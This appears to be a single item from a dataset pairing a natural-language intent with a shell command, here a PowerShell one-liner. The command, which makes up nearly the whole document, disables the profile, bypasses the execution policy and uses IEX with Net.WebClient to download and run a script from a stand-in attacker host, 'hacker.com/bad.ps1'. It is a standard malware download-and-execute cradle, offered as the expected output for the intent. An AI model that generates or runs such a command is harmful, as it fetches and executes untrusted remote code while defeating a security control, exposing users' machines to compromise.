# Natural language intent:
# Execute PowerShell with specific settings to download and execute a script from a specified URL with bypassed execution policy.

powershell.exe -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')"
